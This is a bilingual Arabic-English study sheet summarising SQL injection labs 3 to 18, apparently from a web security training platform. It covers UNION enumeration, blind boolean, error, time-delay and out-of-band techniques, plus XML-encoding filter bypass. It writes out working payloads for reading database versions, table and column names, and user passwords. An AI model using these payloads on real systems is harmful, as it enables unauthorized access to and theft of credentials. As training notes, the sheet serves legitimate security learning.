

## Study Sheet — Labs 3 → 18

> **الفكرة العامة:**  
> SQL Injection معناها إن الـUser Input بيدخل في SQL Query بطريقة غير آمنة، وده ممكن يسمح لنا نغيّر منطق الـQuery أو نقرأ بيانات من الـDatabase.

---

# 03 — SQL Injection: Database Type & Version — Oracle

### 🎯 الهدف

معرفة **نوع الـDatabase والـVersion**.

في اللاب الـDatabase هي **Oracle**.

### 🧠 الفكرة

بعد اكتشاف SQL Injection، نستخدم `UNION SELECT` علشان نضيف Query من عندنا للـQuery الأصلية.

في Oracle يوجد View اسمه:

```sql
v$version
```

يحتوي على معلومات عن إصدار Oracle.

### 💥 Payload

```sql
' UNION SELECT banner, NULL FROM v$version--
```

### 🔍 شرح الـPayload

```text
' 
→ إغلاق الـString الأصلية

UNION SELECT
→ إضافة Query جديدة

banner
→ القيمة التي نريد عرضها

NULL
→ العمود الثاني

FROM v$version
→ مصدر معلومات الـVersion

--
→ تعليق باقي الـQuery
```

### 📌 احفظ

```text
Oracle Version → v$version
```

---

# 04 — SQL Injection: Database Type & Version — MySQL

### 🎯 الهدف

استخراج **Version الـMySQL**.

### 🧠 الفكرة

MySQL توفر System Variable اسمه:

```sql
@@version
```

نقدر نستخدمه داخل `UNION SELECT`.

### 💥 Payload

```sql
' UNION SELECT @@version, NULL#
```

أو حسب طريقة الـComment المقبولة:

```sql
' UNION SELECT @@version, NULL--
```

### 🔍 الفرق عن Oracle

```text
Oracle
→ v$version

MySQL
→ @@version
```

### 📌 احفظ

> أول خطوة بعد اكتشاف SQLi ممكن تكون تحديد نوع الـDB، لأن Syntax الـSQL يختلف من Database لأخرى.

---

# 05 — SQL Injection: Listing Database Contents — Non-Oracle

### 🎯 الهدف

هنا بننتقل من مجرد معرفة الـVersion إلى **استكشاف محتويات الـDatabase**.

الـWorkflow:

```text
Database
   ↓
Tables
   ↓
Columns
   ↓
Data
```

---

## ① استخراج أسماء الـTables

نستخدم:

```sql
information_schema.tables
```

### Payload

```sql
' UNION SELECT table_name, NULL
FROM information_schema.tables--
```

### 🧠 ليه؟

`information_schema` يحتوي على Metadata عن الـDatabase، مثل:

- Tables
    
- Columns
    
- Database information
    

وبالتالي نقدر نعرف أسماء الـTables بدون معرفة محتواها أولًا.

---

## ② البحث عن Table مهم

بعد ظهور أسماء الـTables، نبحث عن Table يبدو أنه يحتوي على بيانات المستخدمين، مثل:

```text
users_abcdef
```

---

## ③ استخراج أسماء الـColumns

نستخدم:

```sql
information_schema.columns
```

### Payload

```sql
' UNION SELECT column_name, NULL
FROM information_schema.columns
WHERE table_name='users_abcdef'--
```

### النتيجة

ممكن نلاقي:

```text
username_abcdef
password_abcdef
```

---

## ④ استخراج البيانات

بعد معرفة:

```text
Table Name
+
Column Names
```

نقدر نقرأ البيانات:

```sql
' UNION SELECT username_abcdef, password_abcdef
FROM users_abcdef--
```

### 🧠 الفكرة كلها

```text
information_schema.tables
        ↓
اعرف الـTables
        ↓
information_schema.columns
        ↓
اعرف الـColumns
        ↓
SELECT
        ↓
استخرج البيانات
```

### ⭐ أهم نقطة

> **Enumeration قبل Extraction.**

يعني الأول نعرف شكل الـDatabase، وبعدها نطلب البيانات.

---

# 06 — SQL Injection: Listing Database Contents — Oracle

### 🎯 الهدف

نفس Lab 5، لكن Database هنا **Oracle**.

### ⚠️ الفرق المهم

في اللابات السابقة استخدمنا:

```text
information_schema
```

لكن Oracle لديها Views مختلفة للـMetadata.

---

## ① اختبار UNION باستخدام DUAL

في Oracle غالبًا يحتاج `SELECT` إلى `FROM`.

لذلك نستخدم:

```sql
' UNION SELECT 'abc','def' FROM dual--
```

### 🧠 ما هو `DUAL`؟

`DUAL` عبارة عن Table خاصة في Oracle تستخدم عندما نحتاج `FROM` لتنفيذ Expression أو قيمة بسيطة.

---

## ② استخراج الـTables

```sql
' UNION SELECT table_name, NULL
FROM all_tables--
```

### النتيجة

نحصل على أسماء الـTables.

---

## ③ استخراج الـColumns

```sql
' UNION SELECT column_name, NULL
FROM all_tab_columns
WHERE table_name='USERS_ABCDEF'--
```

### النتيجة

نعرف أسماء الأعمدة الموجودة داخل الـTable.

---

## ④ استخراج البيانات

```sql
' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF
FROM USERS_ABCDEF--
```

### 📌 احفظ Oracle

```text
DUAL
→ تنفيذ SELECT يحتاج FROM

all_tables
→ أسماء الـTables

all_tab_columns
→ أسماء الـColumns
```

---

# 07 — UNION SQLi: Determine Number of Columns

### 🎯 الهدف

قبل استخدام `UNION SELECT` لازم نعرف:

> الـOriginal Query بترجع كام Column؟

### 🧠 ليه؟

لازم الـUNION يكون عنده نفس عدد الأعمدة.

مثلاً:

```text
Original Query → 3 Columns
```

إذن:

```text
UNION SELECT → 3 Columns
```

---

## 🔍 الاختبار

نجرب:

```sql
' UNION SELECT NULL--
```

ثم:

```sql
' UNION SELECT NULL,NULL--
```

ثم:

```sql
' UNION SELECT NULL,NULL,NULL--
```

وهكذا.

### مثال

لو:

```sql
' UNION SELECT NULL,NULL,NULL--
```

اشتغل، فهذا يدل أن الـQuery ترجع **3 Columns**.

### 🧠 لماذا `NULL`؟

لأن `NULL` لا يفرض علينا معرفة نوع البيانات في الـColumn مسبقًا.

### ⭐ احفظ

```text
UNION
→ Same number of columns
```

---

# 08 — UNION SQLi: Finding a Column Containing Text

### 🎯 الهدف

بعد معرفة عدد الـColumns، نحتاج نعرف:

> أي Column يمكنه عرض **Text/String** في الصفحة؟

مثلاً عرفنا أن عندنا 3 Columns.

نجرب:

```sql
' UNION SELECT 'abc',NULL,NULL--
```

ثم:

```sql
' UNION SELECT NULL,'abc',NULL--
```

ثم:

```sql
' UNION SELECT NULL,NULL,'abc'--
```

### 🧠 الفكرة

نضع String مختلفة في كل Position.

إذا ظهر:

```text
abc
```

فنعرف أن هذا الـColumn هو الذي يظهر في الـResponse ويمكن استخدامه لعرض البيانات.

### Workflow

```text
Determine # Columns
        ↓
Put 'abc' in Column 1
        ↓
Column 2
        ↓
Column 3
        ↓
Find Reflected Column
```

---

# 09 — UNION SQLi: Retrieving Data from Other Tables

### 🎯 الهدف

دلوقتي أصبح عندنا المعلومات الأساسية:

```text
Number of Columns
+
Text Column
```

نبدأ نقرأ بيانات من Table أخرى.

مثلاً:

```sql
' UNION SELECT username, password
FROM users--
```

### 🧠 الفكرة

`UNION` يسمح بضم نتيجة Query إضافية إلى نتيجة الـQuery الأصلية، بشرط توافق عدد الأعمدة.

وبالتالي نستغل الـQuery الجديدة للوصول إلى البيانات التي نريدها.

### 📌 الخلاصة

```text
Find Columns
    ↓
Find Text Column
    ↓
Find Target Table
    ↓
Retrieve Data
```

---

# 10 — UNION SQLi: Retrieving Multiple Values in a Single Column

### 🎯 الهدف

أحيانًا الصفحة تعرض **Column واحد فقط**.

لكن إحنا محتاجين نعرض:

```text
username
password
```

مع بعض.

### 🧠 الحل

نعمل **String Concatenation**.

في PostgreSQL:

```sql
username || '~' || password
```

### Payload

```sql
' UNION SELECT NULL,username||'~'||password
FROM users--
```

### النتيجة

بدل:

```text
username → Column 1
password → Column 2
```

يبقوا:

```text
username~password
```

في Column واحد.

### 📌 `||`

```text
|| = Concatenation
```

أي:

```text
"abc" || "def"
```

تصبح:

```text
abcdef
```

---

# 11 — Blind SQLi: Conditional Responses

### 🎯 الهدف

هنا لا نستطيع رؤية نتيجة الـSQL Query مباشرة.

لذلك نستخدم **Boolean Conditions**.

### TRUE

```sql
' AND 1=1--
```

### FALSE

```sql
' AND 1=2--
```

### 🧠 ماذا نراقب؟

```text
1=1
 ↓
TRUE
 ↓
Response الطبيعي
```

بينما:

```text
1=2
 ↓
FALSE
 ↓
Response مختلف
```

إذن نستطيع سؤال الـDatabase أسئلة من نوع:

```text
هل الشرط صحيح؟
```

---

## 🔥 استخراج Password

بدل الحصول على Password مباشرة، نسأل:

```text
هل طول الـPassword = 1؟
هل طول الـPassword = 2؟
هل طول الـPassword = 3؟
...
```

وبعد معرفة الطول:

```text
هل الحرف الأول = a؟
هل الحرف الأول = b؟
...
```

ثم:

```text
الحرف الثاني؟
الحرف الثالث؟
...
```

### Workflow

```text
Boolean Response
       ↓
Password Length
       ↓
Character Position
       ↓
Character Value
       ↓
Complete Password
```

---

# 12 — Blind SQLi: Conditional Errors

### 🎯 الفكرة

نفس فكرة Lab 11، لكن بدل ما نعتمد على اختلاف محتوى الصفحة، نعتمد على:

```text
Error
/
No Error
```

والـDatabase هنا:

```text
Oracle
```

### 🧠 المنطق

```text
Condition TRUE
      ↓
Database Error

Condition FALSE
      ↓
No Error
```

وبالتالي نستخدم الـError كـBoolean Oracle.

### الفرق

```text
Lab 11
→ Response Difference

Lab 12
→ Error Difference
```

---

# 13 — Visible Error-Based SQLi

### 🎯 الهدف

هنا التطبيق نفسه يعرض **Database Error** في الـResponse.

والـDatabase:

```text
Microsoft SQL Server
```

### 🧠 الفكرة

نستغل Conversion Error.

نستخدم:

```sql
CAST(...)
```

ونحاول تحويل قيمة ليست Integer إلى `int`.

مثلاً:

```sql
CAST((SELECT username FROM users) AS int)
```

بسبب فشل التحويل، ممكن تظهر القيمة داخل رسالة الـError.

### الشكل العام

```sql
' AND 1=CAST((SELECT username FROM users) AS int)--
```

### Workflow

```text
SQL Injection
      ↓
CAST(value AS int)
      ↓
Conversion fails
      ↓
Database Error
      ↓
Value may appear in Error
```

### 📌 ملاحظة

لو الـRequest فيه مساحة محدودة، ممكن إزالة `TrackingId` في اللاب لتقصير الـRequest.

---

# 14 — Blind SQLi: Time Delays

### 🎯 الهدف

لا يوجد Output مفيد ولا Error مفيد.

لكن نستطيع اكتشاف تنفيذ الـSQL عن طريق:

> **وقت استجابة الـServer**

### PostgreSQL

```sql
pg_sleep(10)
```

يعني:

```text
Sleep for 10 seconds
```

### 🧠 الفكرة

```text
Normal Request
→ Response سريع

Payload
→ Database Sleep
→ Response متأخر
```

لو Response اتأخر بالمدة المتوقعة، نعرف أن الـPayload تم تنفيذه.

### ⚠️ مهم

```text
pg_sleep()
→ PostgreSQL
```

وليس Oracle.

---

# 15 — Blind SQLi: Time Delays + Information Retrieval

### 🎯 الهدف

Lab 14 كان هدفه إثبات Blind SQLi عن طريق الـTime Delay.

هنا نستخدم نفس التقنية **لاستخراج Information**.

### Payload Structure

```sql
TrackingId=x';
SELECT CASE
WHEN (condition)
THEN pg_sleep(10)
ELSE pg_sleep(0)
END--
```

### 🧠 شرح

```text
CASE
WHEN condition
```

يعني:

> اختبر الشرط.

إذا كان:

```text
TRUE
```

نفذ:

```sql
pg_sleep(10)
```

إذا:

```text
FALSE
```

نفذ:

```sql
pg_sleep(0)
```

### بالتالي

```text
10 seconds delay
→ TRUE

No delay
→ FALSE
```

### نستخدمها لاستخراج:

```text
Table Name
     ↓
Username
     ↓
Password Length
     ↓
Password Characters
```

### ⭐ الفكرة الأساسية

> بدل ما الـDatabase ترجع لنا القيمة، هي "تجاوب" على السؤال عن طريق الوقت.

---

# 16 — Blind SQLi: Out-of-Band Interaction

### 🎯 الهدف

هنا لا يوجد:

```text
Response Difference
❌

Error
❌

Time Delay
❌
```

نستخدم **Out-of-Band Interaction**.

### 🧠 الفكرة

نجعل الـDatabase تعمل Network Request إلى Server نتحكم فيه/نراقبه، مثل:

```text
Burp Collaborator
```

### Workflow

```text
SQL Injection
      ↓
Database executes payload
      ↓
Database makes outbound request
      ↓
Burp Collaborator
      ↓
Interaction received
```

إذا ظهر Interaction في Burp Collaborator:

```text
→ نعرف أن الـPayload تم تنفيذه.
```

### في اللاب

يتم استغلال Oracle XML functionality وExternal Entity لإجبار الـDatabase على إجراء Outbound Request.

---

# 17 — Blind SQLi: OOB Data Exfiltration

### 🎯 الهدف

Lab 16:

```text
إثبات تنفيذ الـPayload
```

Lab 17:

```text
استخراج Data عن طريق OOB
```

### 🧠 الفكرة

نريد الحصول على Password الخاصة بـ:

```text
administrator
```

الفكرة المنطقية:

```text
SELECT password
FROM users
WHERE username='administrator'
```

ثم نضع نتيجة الـQuery داخل الـOutbound Request.

### Workflow

```text
SQL Injection
      ↓
SELECT password
      ↓
Oracle XML Processing
      ↓
External Entity
      ↓
Outbound Request
      ↓
Burp Collaborator
      ↓
Password
```

### أهم مكونات اللاب

```text
EXTRACTVALUE
XMLTYPE
External Entity
Burp Collaborator
```

### 📌 الفرق بين 16 و17

```text
16 → OOB Interaction

17 → OOB Data Exfiltration
```

---

# 18 — SQLi Filter Bypass via XML Encoding

### 🎯 الهدف

التطبيق يستقبل **XML**، ويوجد SQL Injection.

لكن يوجد Filter يمنع كلمات مثل:

```text
UNION
SELECT
FROM
```

### 🧠 المشكلة

لو أرسلت:

```text
UNION SELECT
```

مباشرة:

```text
Filter
 ↓
Blocked ❌
```

فنستخدم **XML Entity Encoding**.

### Workflow

```text
SQL Payload
      ↓
XML Encoding
      ↓
Filter
      ↓
XML Parser
      ↓
Decode
      ↓
SQL Processing
```

### باستخدام Burp + Hackvertor

```text
Intercept Request
       ↓
HTTP History
       ↓
Hackvertor
       ↓
Encode
       ↓
hex_entities
```

ثم يتم إرسال الـEncoded Input.

### 🧠 الفكرة الأساسية

الـFilter قد يبحث عن الـKeyword بصورته العادية، بينما الـXML Parser يقوم بفك الـEntity Encoding قبل استخدام القيمة.

### الهدف النهائي في اللاب

استخدام SQL Injection لاستخراج بيانات المستخدمين، مثل:

```sql
UNION SELECT username || '~' || password FROM users
```

بعد تجاوز الـFilter بالـEncoding المناسب.

---

# 🧠 SQL Injection Master Flow

```text
                    SQL Injection
                         │
             ┌───────────┴───────────┐
             │                       │
          UNION                    BLIND
             │                       │
       ┌─────┴─────┐          ┌──────┼─────────┐
       │           │          │      │         │
   Columns      Data       Boolean  Time      OOB
       │           │          │      │         │
       ↓           ↓          ↓      ↓         ↓
    Tables      Users      True/   Delay   Collaborator
    Columns     Password   False
```

---

# 📚 أهم Commands / Concepts

|الهدف|التقنية|
|---|---|
|Oracle Version|`v$version`|
|MySQL Version|`@@version`|
|Non-Oracle Tables|`information_schema.tables`|
|Non-Oracle Columns|`information_schema.columns`|
|Oracle Tables|`all_tables`|
|Oracle Columns|`all_tab_columns`|
|Oracle Dummy Table|`dual`|
|Number of Columns|`UNION SELECT NULL...`|
|Text Column|`'abc'` في كل Position|
|Multiple Values|`|
|Boolean Blind|`AND condition`|
|Error-Based|`CAST()`|
|PostgreSQL Delay|`pg_sleep()`|
|OOB|Burp Collaborator|
|XML Filter Bypass|XML Entity Encoding|
|Hackvertor|`hex_entities`|

---

# ⭐ أهم 5 أفكار لازم تكون فاهمهم

### 1️⃣ UNION SQLi

```text
Number of Columns
       ↓
Text Column
       ↓
Tables
       ↓
Columns
       ↓
Data
```

### 2️⃣ Blind SQLi

```text
Data مش ظاهرة
       ↓
اسأل Database سؤال Boolean
       ↓
True / False
       ↓
استخرج المعلومة تدريجيًا
```

### 3️⃣ Time-Based

```text
Condition TRUE
→ Sleep

Condition FALSE
→ No Sleep
```

### 4️⃣ OOB

```text
Database
→ Network Request
→ Collaborator
```

### 5️⃣ Filter Bypass

```text
Blocked Keyword
→ Encode
→ Filter Bypass
→ Parser Decode
→ SQL Execution
```

---

# ⚡ Quick Revision

```text
03 → Oracle Version
04 → MySQL Version

05 → Tables → Columns → Data
06 → Oracle Tables → Columns → Data

07 → Number of Columns
08 → Find Text Column
09 → Retrieve Data
10 → Multiple Values in One Column

11 → Blind → Conditional Response
12 → Blind → Conditional Error
13 → Visible Error → CAST

14 → Blind → Time Delay
15 → Time Delay + Information

16 → OOB Interaction
17 → OOB Data Exfiltration

18 → Filter Bypass → XML Encoding
```

> [!important] طريقة التفكير في أي SQLi Lab  
> **اسأل نفسك دائمًا:**
> 
> 1. هل الـSQL Injection موجود؟
>     
> 2. ما نوع الـDatabase؟
>     
> 3. كام Column؟
>     
> 4. أنهي Column بيظهر؟
>     
> 5. أقدر أقرأ Tables؟
>     
> 6. أقدر أقرأ Columns؟
>     
> 7. أقدر أوصل للـData؟
>     
> 8. لو مفيش Output، أستخدم Boolean / Error / Time / OOB؟
>